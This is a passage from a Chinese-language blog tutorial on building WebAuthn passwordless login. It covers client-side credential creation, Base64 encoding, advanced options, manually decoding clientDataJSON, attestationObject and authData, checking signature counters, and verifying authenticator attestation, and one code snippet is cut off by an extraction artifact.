几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 